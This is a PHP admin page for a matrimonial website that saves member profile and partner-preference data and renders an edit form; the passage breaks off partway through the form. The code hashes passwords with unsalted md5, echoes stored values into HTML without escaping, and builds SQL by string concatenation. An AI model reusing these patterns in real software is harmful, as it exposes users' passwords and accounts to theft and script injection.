<?php
include_once '../databaseConn.php';
include_once '../class/Config.class.php';
$configObj = new Config();
include_once './lib/requestHandler.php';
$DatabaseCo = new DatabaseConn();
include_once '../class/Config.class.php';
$configObj = new Config();
$matri_id=isset($_GET['matri_id'])?mysqli_real_escape_string($DatabaseCo->dbLink,$_GET['matri_id']):"";
$isPostBack = ($_SERVER["REQUEST_METHOD"]==="POST");
if($isPostBack)
{      
if(isset($_REQUEST['submit_form1'])){
$fname=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['firstname']);
$lname=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['lastname']);
$username=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['firstname'])." ".mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['lastname']);
$profileby=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['profileby']);
$mobile_code=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['mobile_code']);
$mobile=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['mobile']);
$email=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['email']);
$my_pass=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['my_pass']);
$gender=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['gender']);
$dob=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['year']).'-'.mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['month']).'-'.mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['day']);
$m_status=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['m_status']);
$mothertongue=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['mothertongue']);
$no_child=isset($_REQUEST['no_child'])?mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['no_child']):'';
$child_status=isset($_REQUEST['child_status'])?mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['child_status']):'';
$religion_id=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['religion_id']);
$caste_id=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['caste_id']);
$sub_caste_id=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['sub_caste_id']);
$willing_to_mary=isset($_REQUEST['willing_to_mary'])?mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['willing_to_mary']):'';
$country_id=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['country_id']);
$state=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['state']);
$city=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['city']); 
$height=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['height']);
$weight=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['weight']);
$physicalstatus=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['physical_status']);
$bodytype=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['bodytype']);
$complexion=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['complexion']);
$edu_id=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['edu_id'].','.$_REQUEST['edu_id1']);
$occupation=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['occupation']);
$employed_in=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['employed_in']);
$annual_income=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['annual_income']);
$diet=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['diet']);
$smoke=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['smoke']);
$drink=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['drink']);
$manglik=isset($_REQUEST['manglik'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(", ",$_REQUEST['manglik'])):'';
$star=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['star']);
$birthplace=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['birth_place']);
$moonsign=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['moonsign']);	
$birthtime=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['birth_time']);
$family_status=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['family_status']);
$family_value=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['family_value']);
$family_type=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['family_type']);
$father_ocp=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['father_occupation']);
$mother_ocp=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['mother_occupation']);
$no_of_sister=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['no_of_sister']);
$no_of_brother=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['no_of_brother']);
$no_of_married_brother=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['no_of_marri_brother']);
$no_of_married_sister=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['no_of_marri_sister']);
$hobby=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['hobby']);
$language=mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['language']));
$profile_text=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['profile_text']); 
$profile_text_date=date('H:i:s Y-m-d ');
if($my_pass!='')
{									
$pass=",password='".md5($my_pass)."'";	
}
else
{
$pass='';	
}
if(isset($_GET['matri_id']) && $_GET['matri_id']!='')
{
$SQL_STATEMENT="update register set firstname='$fname',lastname='$lname',username='$username',email='$email',mobile_code='$mobile_code',mobile='$mobile',profileby='$profileby',gender='$gender',birthdate='$dob',m_status='$m_status',m_tongue='$mothertongue',tot_children='$no_child',status_children='$child_status',religion='$religion_id',caste='$caste_id',subcaste='$sub_caste_id',will_to_mary_caste='$willing_to_mary',country_id='$country_id',state_id='$state',city='$city',height='$height',weight='$weight',physicalStatus='$physicalstatus',bodytype='$bodytype',complexion='$complexion',edu_detail='$edu_id',occupation='$occupation',emp_in='$employed_in',income='$annual_income',diet='$diet',smoke='$smoke',drink='$drink',manglik='$manglik',star='$star',moonsign='$moonsign',birthplace='$birthplace',birthtime='$birthtime',family_type='$family_type',family_value='$family_value',family_status='$family_status',father_occupation='$father_ocp',mother_occupation='$mother_ocp',no_of_brothers='$no_of_brother',no_of_sisters='$no_of_sister',no_marri_brother='$no_of_married_brother',no_marri_sister='$no_of_married_sister',hobby='$hobby',language_known='$language',profile_text='$profile_text',profile_text_approve='Approve',profile_text_date='$profile_text_date',photo_view_status='1',photo_protect='No'$pass where matri_id='$matri_id'";
$statusObj = handle_post_request("UPDATE",$SQL_STATEMENT,$DatabaseCo);
$status_MESSAGE = $statusObj->getstatusMessage();
}
else
{
$tm=mktime(date('h')+5,date('i')+30,date('s'));
$reg_date=date('Y-m-d h:i:s',$tm);
$order_status = "No";
$photo_protect = "No";
$s="select * from register";
$rr=$DatabaseCo->dbLink->query($s);
$dd=mysqli_fetch_array($rr);
$prefix=$dd['prefix']?$dd['prefix']:'GT';
$adminrole_id='1';
$adminrole_view_status='Yes';
$status='Inactive';
$ip=$_SERVER['REMOTE_ADDR'];                
$agent=$_SERVER['HTTP_USER_AGENT'];  
$password123=md5($my_pass);
	$check_email=$DatabaseCo->dbLink->query("SELECT email FROM register WHERE email='$email'");
			$count_email=mysqli_num_rows($check_email);
			if($count_email == 0){
			$DatabaseCo->dbLink->query("insert into register (index_id,matri_id,prefix, terms,email,password,m_status,username,firstname,lastname,mobile_code,mobile,profileby,gender,birthdate,m_tongue,tot_children,status_children,religion,caste,will_to_mary_caste,country_id,state_id,city,height,weight,physicalStatus,bodytype,complexion,edu_detail,occupation,emp_in,income,diet,smoke,drink,manglik,star,moonsign,birthplace,birthtime,family_type,family_value,family_status,father_occupation,mother_occupation,no_of_brothers,no_of_sisters,no_marri_brother,no_marri_sister,hobby,language_known,profile_text,profile_text_approve,profile_text_date,reg_date,ip,agent,status,adminrole_id,adminrole_view_status,photo_view_status,photo_protect)
			values('NULL','$matri_id','$prefix','Yes','$email','$password123','$m_status','$username','$fname','$lname','$mobile_code','$mobile','$profileby','$gender','$dob','$mothertongue','$no_child','$child_status','$religion_id','$caste_id','$willing_to_mary','$country_id','$state','$city','$height','$weight','$physicalstatus','$bodytype','$complexion','$edu_id','$occupation','$employed_in','$annual_income','$diet','$smoke','$drink','$manglik','$star','$moonsign','$birthplace','$birthtime','$family_type','$family_value','$family_status','$father_ocp','$mother_ocp','$no_of_brother','$no_of_sister','$no_of_married_brother','$no_of_married_sister','$hobby','$language','$profile_text','Approved','$profile_text_date','$reg_date','$ip','$agent','$status','$adminrole_id','$adminrole_view_status','1','No')");
			$get_reg_id=mysqli_insert_id($DatabaseCo->dbLink);
			$matri_id=$prefix.$get_reg_id;
			$DatabaseCo->dbLink->query("update register set matri_id='$matri_id' where email='$email'") or die(mysqli_error($DatabaseCo->dbLink));
			echo "<script>window.location='editprofile?matri_id=".$matri_id."&status=success'</script>";
			}else{
				echo "<script>alert('Email id already exist.');</script>";
				echo "<script>window.location='editprofile;</script>";
			}
	}
}
if(isset($_REQUEST['submit_form3']))
{
// Partner Preference
$looking_for=mysqli_real_escape_string($DatabaseCo->dbLink,implode(", ",$_REQUEST['looking']));
$pfrom_age=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['pfrom_age']);
$pto_age=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['pto_age']);
$part_height=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['part_height']);
$part_height_to=mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['part_height_to']);
$part_edu=isset($_REQUEST['part_edu'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_edu'])):"";
$part_income=isset($_REQUEST['part_drink123'])?mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['part_income']):"";
$part_smoke=isset($_REQUEST['part_smoke'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_smoke'])):'';
$part_drink=isset($_REQUEST['part_drink123'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_drink123'])):'';
$part_occupation=isset($_REQUEST['part_occupation'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_occupation'])):'';
$part_emp_in=isset($_REQUEST['part_emp_in'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_emp_in'])):"";
$part_designation=isset($_REQUEST['part_designation'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_designation'])):"";
$part_manglik=isset($_REQUEST['part_manglik'])?mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['part_manglik']):"";
$part_country_id=isset($_REQUEST['part_country_id'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_country_id'])):"";
$part_state=isset($_REQUEST['part_state'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_state'])):"";
$part_city=isset($_REQUEST['part_state'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_city'])):"";
$part_religion_id=isset($_REQUEST['part_religion_id'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_religion_id'])):'';
$part_caste_id=isset($_REQUEST['part_caste_id'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_caste_id'])):'';
$part_complexion=isset($_REQUEST['part_complexion'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(", ",$_REQUEST['part_complexion'])):'';
$part_mtongue=isset($_REQUEST['part_mtongue'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_mtongue'])):'';
$part_physical=isset($_REQUEST['part_physical'])?mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['part_physical']):'';
$part_diet=isset($_REQUEST['part_diet'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_diet'])):"";
$part_star=isset($_REQUEST['part_star'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(", ",$_REQUEST['part_star'])):"";
$part_resi_status=isset($_REQUEST['part_resi_status'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(",",$_REQUEST['part_resi_status'])):"";
$expectation= mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['expectation']);
$part_expect_date= date('H:i:s Y-m-d ');
$part_subcaste= isset($_REQUEST['part_subcaste'])?mysqli_real_escape_string($DatabaseCo->dbLink,$_REQUEST['part_subcaste']):'';
$part_rasi= isset($_REQUEST['part_rasi'])?mysqli_real_escape_string($DatabaseCo->dbLink,implode(", ",$_REQUEST['part_rasi'])):"";                              
$SQL_STATEMENT="update register set looking_for='$looking_for',part_frm_age='$pfrom_age',part_to_age='$pto_age',part_height='$part_height',part_height_to='$part_height_to',part_edu='$part_edu',part_income='$part_income',part_drink='$part_drink',part_smoke='$part_smoke',part_occu='$part_occupation',part_emp_in='$part_emp_in',part_manglik='$part_manglik',part_country_living='$part_country_id',part_state='$part_state',part_city='$part_city',part_religion='$part_religion_id',part_caste='$part_caste_id',part_complexation='$part_complexion',part_mtongue='$part_mtongue',part_physical='$part_physical',part_diet='$part_diet',part_star='$part_star',part_resi_status='$part_resi_status',part_expect='$expectation',part_expect_approve='Approved',part_expect_date='$part_expect_date',part_subcaste='$part_subcaste',part_rasi='$part_rasi' where matri_id='$matri_id'";
}
$statusObj = handle_post_request("UPDATE",$SQL_STATEMENT,$DatabaseCo);
$status_MESSAGE = $statusObj->getstatusMessage();
}
else
{
$statusObj = new status();
$statusObj->setActionSuccess(false);
$status_MESSAGE = "Please select value to complete action.";	  
} 
$sql=$DatabaseCo->dbLink->query("select * from register_view where matri_id='$matri_id'");
$row=mysqli_fetch_array($sql);
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Manage | Edit Profile
    </title>
    <meta name="keyword" content="<?php echo $configObj->getConfigKeyword();?>" />
    <meta name="description" content="<?php echo $configObj->getConfigDescription();?>" />  
    <link type="image/x-icon" href="img/<?php echo $configObj->getConfigFevicon();?>" rel="shortcut icon"/>
    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
    <!-- BOOTSTRAP & CUSTOM CSS -->
    <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <link href="css/custom.css" rel="stylesheet" type="text/css" />
    <!-- BOOTSTRAP & CUSTOM CSS END-->    
    <!-- FONTAWSOME -->
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
    <!-- FONTAWSOME END-->
    <!-- IONICONS -->
    <link href="http://code.ionicframework.com/ionicons/2.0.0/css/ionicons.min.css" rel="stylesheet" type="text/css" />
    <!-- IONICONS END-->    
    <!-- THEME CSS -->
    <link href="dist/css/AdminLTE.min.css" rel="stylesheet" type="text/css" />
    <link href="dist/css/skins/_all-skins.min.css" rel="stylesheet" type="text/css" />
    <!-- THEME CSS END-->
	<!-- ICHECK CHECKBOX CSS -->
    <link href="plugins/iCheck/flat/blue.css" rel="stylesheet" type="text/css" />
    <!-- ICHECK CHECKBOX CSS END -->
    <!-------------------Validation css ------------------>
    <link rel="stylesheet" href="../css/validate.css">
    <!-------------------Validation css------------------>
    <!-------------------chosen css ------------------>
    <link rel="stylesheet" href="../css/chosen.css">
    <link rel="stylesheet" href="../css/prism.css">
    <!-------------------chosen css end------------------>
    <!---------------Js Birth date------------------>  
    <script type="text/javascript">
      var numDays = {
        '01': 31, '02': 28, '03': 31, '04': 30, '05': 31, '06': 30, 
        '07': 31, '08': 31, '09': 30, '10': 31, '11': 30, '12': 31
      };
      function setDays(oMonthSel, oDaysSel, oYearSel)
      {
        var nDays, oDaysSelLgth, opt, i = 1;
        nDays = numDays[oMonthSel[oMonthSel.selectedIndex].value];
        if (nDays == 28 && oYearSel[oYearSel.selectedIndex].value % 4 == 0) 
          ++nDays;
        oDaysSelLgth = oDaysSel.length;
        if (nDays != oDaysSelLgth)
        {
          if (nDays < oDaysSelLgth) 
            oDaysSel.length = nDays;
          else for (i; i < nDays - oDaysSelLgth + 1; i++)
          {
            opt = new Option(oDaysSelLgth + i, oDaysSelLgth + i);
            oDaysSel.options[oDaysSel.length] = opt;
          }
        }
        var oForm = oMonthSel.form;
        var month = oMonthSel.options[oMonthSel.selectedIndex].value;
        var day = oDaysSel.options[oDaysSel.selectedIndex].value;
        var year = oYearSel.options[oYearSel.selectedIndex].value;
        //oForm.datepicker.value = year + '-' + month + '-' + day;
      }
    </script>
    <!---------------Js Birth date End------------------>    
    <script type="text/javascript">
      function check_status(status)
      {
        //alert(status);
        if(status=='Never Married')
        {
          $('#dis_child').hide();
        }
        if(status=='Widower')
        {
          $('#dis_child').show();
        }
		  if(status=='Widow')
        {
          $('#dis_child').show();
        }
        if(status=='Divorced')
        {
          $('#dis_child').show();
        }
        if(status=='Awaiting Divorce')
        {
          $('#dis_child').show();
        }
      }
    </script>
    <style>
      .default {
        width: 252px !important;
      }
    </style>
  </head>
  <body class="skin-blue">
    <!-- ICON LOADER-->
        <div class="preloader-wrapper text-center">
            <div class="spinner"></div>
        </div>
        <!-- ICON LOADER END-->
    <div class="wrapper" style="display:none" id="body">
      <?php include "page-part/header.php"; ?> 
      <!-- Left side column. contains the logo and sidebar -->
      <?php include "page-part/left_panel.php"; ?>
      <!-- Content Wrapper. Contains page content -->
      <div class="content-wrapper">
        <!-- Content Header (Page header) -->
        <section class="content-header">
          <h1 class="lightGrey">
            Add Members
          </h1>
          <ol class="breadcrumb">
            <li>
              <a href="dashboard">
                <i class="fa fa-home">
                </i> Home
              </a>
            </li>
            <li class="active">Add Members
            </li>
          </ol>
        </section>
        <!-- Main content -->
        <section class="content">
          <!-- Main row -->
          <div class="row">
            <div class="col-lg-12 col-xs-12 col-sm-12">
              <div class="box-top">
              	<div class="row">
                <?php 
									$checkStaff=$DatabaseCo->dbLink->query("SELECT can_members from staff WHERE staff_id='$staff_id'");
									$get_staff_data=mysqli_fetch_array($checkStaff);
									if($get_staff_data['can_members'] == 'Yes'|| $get_staff_data['can_members'] == '' ){
								?>
								<div class="col-lg-2 col-xs-12 col-sm-6">
								  <a href="members" class="btn btn-lg btn-green btn-block">
									<i class="fa fa-users"></i>All Member
								  </a>
								</div>
								<?php
									}
		  						?>
                <div class="col-lg-2 col-xs-12 col-sm-6">
                  <a href="editprofile?action=ADD" class="btn btn-lg btn-green btn-block">
                    <i class="fa fa-user-plus">
                    </i>Add Member
                  </a>
                </div>
                
              </div>
            </div>
            <?php
				if(isset($_GET['status']) && $_GET['status']=="success")
				{
				$statusObj = new status();
				$statusObj->setActionSuccess(true);
				$status_MESSAGE="Member successfully Register.";	
				}
				if(!empty($status_MESSAGE))
				{	
				if($statusObj->getActionSuccess()){
				echo  "<div class='alert alert-success' id='success_msg'><i class='fa fa-check-circle fa-fw fa-lg'></i> ".$status_MESSAGE."</div>";
				}
				}
		    ?>
            <section class="content">
              <div class="nav-tabs-custom">
                <ul class="nav nav-tabs nav-justified mt-10">
                  <li class="active">
                    <a href="#tab_1" data-toggle="tab">
                      Member Details
                    </a>
                  </li>
                  <li>
                    <a href="#tab_2" data-toggle="tab">
                      Upload Photos
                    </a>	
                  </li>
                  <li>
                    <a href="#tab_3" data-toggle="tab">
                      Partner Preference 
                    </a>
                  </li>
                </ul>
                <div class="tab-content">
                  <div class="tab-pane active" id="tab_1">
                    <form method="post" name="user_detail" id="user_detail">
                      <h3 class="text-success">
                        <i class="fa fa-file-text gtMarginRight10">
                        </i>Basic Details
                      </h3>
                      <div class="row">
                        <div class="col-md-6">
                            <div class="form-group">
                                <label>User Name </label>
                                <div class="row">
                                    <div class="col-xs-6">
                                         <input type="text" class="form-control" placeholder="Enter First Name" data-validetta="required" value="<?php echo $row['firstname']; ?>" name="firstname">
                                    </div>
                                    <div class="col-xs-6">
                                         <input type="text" class="form-control" placeholder="Enter Last Name" data-validetta="required" value="<?php echo $row['lastname']; ?>" name="lastname">
                                    </div>
                                </div>
                               
                              </div>
                            <div class="form-group">
                    <label>Mobile No
                    </label>
                    <div class="row">
                      <div class="col-xs-4">
                        <select class="form-control" name="mobile_code" id="mobile_code" data-validetta="required" >
                          <option value="+93">+93
                          </option>
                          <option value="+355">+355
                          </option>
                          <option value="+213">+213
                          </option>
                          <option value="+684">+684
                          </option>
                          <option value="+376">+376
                          </option>
                          <option value="+244">+244
                          </option>
                          <option value="+1">+1
                          </option>
                          <option value="+1">+1
                          </option>
                          <option value="+54">+54
                          </option>
                          <option value="+374">+374
                          </option>
                          <option value="+61">+61
                          </option>
                          <option value="+43">+43
                          </option>
                          <option value="+994">+994
                          </option>
                          <option value="+1">Bahamas (+1)
                          </option>
                          <option value="+973">+973
                          </option>
                          <option value="+880">+880
                          </option>
                          <option value="+1">Barbados (+1)
                          </option>
                          <option value="+375">+375
                          </option>
                          <option value="+32">+32
                          </option>
                          <option value="+501">+501
                          </option>
                          <option value="+1">Bermuda (+1)
                          </option>
                          <option value="+975">+975
                          </option>
                          <option value="+591">+591
                          </option>
                          <option value="+387">+387
                          </option>
                          <option value="+267">+267
                          </option>
                          <option value="+55">Brazil (+55)
                          </option>
                          <option value="+1">(+1)Virgin Islands (British) 
                          </option>
                          <option value="+673">+673
                          </option>
                          <option value="+359">+359
                          </option>
                          <option value="+226">+226
                          </option>
                          <option value="+257">+257
                          </option>
                          <option value="+225">+225
                          </option>
                          <option value="+855">+855
                          </option>
                          <option value="+237">+237
                          </option>
                          <option value="+1">+1
                          </option>
                          <option value="+238">+238
                          </option>
                          <option value="+1">+1
                          </option>
                          <option value="+236">+236
                          </option>
                          <option value="+235">+235
                          </option>
                          <option value="+56">+56
                          </option>
                          <option value="+86">+86
                          </option>
                          <option value="+57">+57
                          </option>
                          <option value="+269">+269
                          </option>
                          <option value="+242">+242
                          </option>
                          <option value="+682">+682
                          </option>
                          <option value="+506">+506
                          </option>
                          <option value="+385">+385
                          </option>
                          <option value="+53">+53
                          </option>
                          <option value="+357">+357
                          </option>
                          <option value="+420">+420
                          </option>
                          <option value="+850">+850
                          </option>
                          <option value="+243">+243
                          </option>
                          <option value="+45">+45
                          </option>
                          <option value="+253">+253
                          </option>
                          <option value="+1">+1
                          </option>
                          <option value="+1">+1
                          </option>
                          <option value="+670">+670
                          </option>
                          <option value="+593">+593
                          </option>
                          <option value="+20">+20
                          </option>
                          <option value="+503">+503
                          </option>
                          <option value="+240">+240
                          </option>
                          <option value="+291">+291
                          </option>
                          <option value="+372">+372
                          </option>
                          <option value="+251">+251
                          </option>
                          <option value="+500">+500
                          </option>
                          <option value="+298">+298
                          </option>
                          <option value="+679">+679
                          </option>
                          <option value="+358">+358
                          </option>
                          <option value="+33">+33
                          </option>
                          <option value="+594">+594
                          </option>
                          <option value="+689">+689
                          </option>
                          <option value="+241">+241
                          </option>
                          <option value="+220">+220
                          </option>
                          <option value="+995">+995
                          </option>
                          <option value="+49">+49
                          </option>
                          <option value="+233">+233
                          </option>
                          <option value="+350">+350
                          </option>
                          <option value="+30">+30
                          </option>
                          <option value="+299">+299
                          </option>
                          <option value="+1">+1
                          </option>
                          <option value="+590">+590
                          </option>
                          <option value="+1">+1
                          </option>
                          <option value="+502">+502
                          </option>
                          <option value="+224">+224
                          </option>
                          <option value="+245">+245
                          </option>
                          <option value="+592">+592
                          </option>
                          <option value="+509">+509
                          </option>
                          <option value="+504">+504
                          </option>
                          <option value="+852" label="Hong Kong SAR (+852)">+852
                          </option>
                          <option value="+36">+36
                          </option>
                          <option value="+354">+354
                          </option>
                          <option value="+91" 
                                  <?php if(!isset($row['mobile_code']))
                          {?> selected 
                          <?php }?>>+91
                          </option>
                        <option value="+62">+62
                        </option>
                        <option value="+98">+98
                        </option>
                        <option value="+964">+964
                        </option>
                        <option value="+353">+353
                        </option>
                        <option value="+972">+972
                        </option>
                        <option value="+39">+39
                        </option>
                        <option value="+1">Jamaica (+1)
                        </option>
                        <option value="+81">+81
                        </option>
                        <option value="+962">+962
                        </option>
                        <option value="+7">+7
                        </option>
                        <option value="+254">+254
                        </option>
                        <option value="+686">+686
                        </option>
                        <option value="+82">+82
                        </option>
                        <option value="+965">+965
                        </option>
                        <option value="+996">+996
                        </option>
                        <option value="+856">+856
                        </option>
                        <option value="+371">+371
                        </option>
                        <option value="+961">+961
                        </option>
                        <option value="+266">+266
                        </option>
                        <option value="+231">+231
                        </option>
                        <option value="+218">+218
                        </option>
                        <option value="+423">+423
                        </option>
                        <option value="+370">+370
                        </option>
                        <option value="+352">+352
                        </option>
                        <option value="+853">+853
                        </option>
                        <option value="+261">+261
                        </option>
                        <option value="+265">+265
                        </option>
                        <option value="+60">+60
                        </option>
                        <option value="+960">+960
                        </option>
                        <option value="+223">+223
                        </option>
                        <option value="+356">+356
                        </option>
                        <option value="+596">+596
                        </option>
                        <option value="+222">+222
                        </option>
                        <option value="+230">+230
                        </option>
                        <option value="+269">+269
                        </option>
                        <option value="+52">+52
                        </option>
                        <option value="+691">+691
                        </option>
                        <option value="+373">+373
                        </option>
                        <option value="+377">+377
                        </option>
                        <option value="+976">+976
                        </option>
                        <option value="+1">Montserrat (+1)
                        </option>
                        <option value="+212">+212
                        </option>
                        <option value="+258">+258
                        </option>
                        <option value="+95">+95
                        </option>
                        <option value="+264">+264
                        </option>
                        <option value="+674">+674
                        </option>
                        <option value="+977">+977
                        </option>
                        <option value="+31">+31
                        </option>
                        <option value="+599">+599
                        </option>
                        <option value="+687">+687
                        </option>
                        <option value="+64">+64
                        </option>
                        <option value="+505">+505
                        </option>
                        <option value="+227">+227
                        </option>
                        <option value="+234">+234
                        </option>
                        <option value="+683">+683
                        </option>
                        <option value="+672">+672
                        </option>
                        <option value="+47">+47
                        </option>
                        <option value="+968">+968
                        </option>
                        <option value="+92">+92
                        </option>
                        <option value="+507">+507
                        </option>
                        <option value="+675">+675
                        </option>
                        <option value="+595">+595
                        </option>
                        <option value="+51">+51
                        </option>
                        <option value="+63">+63
                        </option>
                        <option value="+672">+672
                        </option>
                        <option value="+48">+48
                        </option>
                        <option value="+351">+351
                        </option>
                        <option value="+1">Puerto Rico (+1)
                        </option>
                        <option value="+974">+974
                        </option>
                        <option value="+262">+262
                        </option>
                        <option value="+40">+40
                        </option>
                        <option value="+7">+7
                        </option>
                        <option value="+250">+250
                        </option>
                        <option value="+290">+290
                        </option>
                        <option value="+1">St. Kitts and Nevis (+1)
                        </option>
                        <option value="+1">St. Lucia (+1)
                        </option>
                        <option value="+508">+508
                        </option>
                        <option value="+1">St. Vincent &amp; Grenadines (+1)
                        </option>
                        <option value="+685">+685
                        </option>
                        <option value="+378">+378
                        </option>
                        <option value="+239">+239
                        </option>
                        <option value="+966">+966
                        </option>
                        <option value="+221">+221
                        </option>
                        <option value="+381">+381
                        </option>
                        <option value="+248">+248
                        </option>
                        <option value="+232">+232
                        </option>
                        <option value="+65">+65
                        </option>
                        <option value="+421">+421
                        </option>
                        <option value="+386">+386
                        </option>
                        <option value="+677">+677
                        </option>
                        <option value="+252">+252
                        </option>
                        <option value="+27">+27
                        </option>
                        <option value="+34">+34
                        </option>
                        <option value="+94">+94
                        </option>
                        <option value="+249">+249
                        </option>
                        <option value="+597">+597
                        </option>
                        <option value="+268">+268
                        </option>
                        <option value="+46">+46
                        </option>
                        <option value="+41">+41
                        </option>
                        <option value="+963">+963
                        </option>
                        <option value="+886">+886
                        </option>
                        <option value="+992">+992
                        </option>
                        <option value="+255">+255
                        </option>
                        <option value="+66">+66
                        </option>
                        <option value="+389">+389
                        </option>
                        <option value="+228">+228
                        </option>
                        <option value="+690">+690
                        </option>
                        <option value="+676">+676
                        </option>
                        <option value="+1">Trinidad and Tobago (+1)
                        </option>
                        <option value="+216">+216
                        </option>
                        <option value="+90">+90
                        </option>
                        <option value="+993">+993
                        </option>
                        <option value="+1">Turks and Caicos Islands (+1)
                        </option>
                        <option value="+688">+688
                        </option>
                        <option value="+256">+256
                        </option>
                        <option value="+380">+380
                        </option>
                        <option value="+971">+971
                        </option>
                        <option value="+44">+44
                        </option>
                        <option value="+1">+1
                        </option>
                        <option value="+598">+598
                        </option>
                        <option value="+1">USA (+1)
                        </option>
                        <option value="+998">+998
                        </option>
                        <option value="+678">+678
                        </option>
                        <option value="+58">+58
                        </option>
                        <option value="+84">+84
                        </option>
                        <option value="+681">+681
                        </option>
                        <option value="+967">+967
                        </option>
                        <option value="+381">+381
                        </option>
                        <option value="+260">+260
                        </option>
                        <option value="+263">+263
                        </option>
                        <option value="+297">+297
                        </option>
                        <option value="+229">+229
                        </option>
                        <option value="+599">+599
                        </option>
                        <option value="+246">+246
                        </option>
                        <option value="+599">+599
                        </option>
                        <option value="+379">+379
                        </option>
                        <option value="+692">+692
                        </option>
                        <option value="+1">Northern Mariana Islands (+1)
                        </option>
                        <option value="+680">+680
                        </option>
                        <option value="+970">+970
                        </option>
                        <option value="+590">+590
                        </option>
                        <option value="+590">+590
                        </option>
                        <option value="+211">+211
                        </option>
                        <option value="+670">+670
                        </option>
                        <option value="+382">+382
                        </option>
                        <?php
    if(isset($row['mobile_code']) && $row['mobile_code']!='')
    {
    ?>
                        <option value="<?php echo $row['mobile_code'];?>" selected> 
                          <?php echo $row['mobile_code'];?>
                        </option>
                        <?php
    }	
    ?>
                        </select>
                    </div>
                    <div class="col-xs-8">
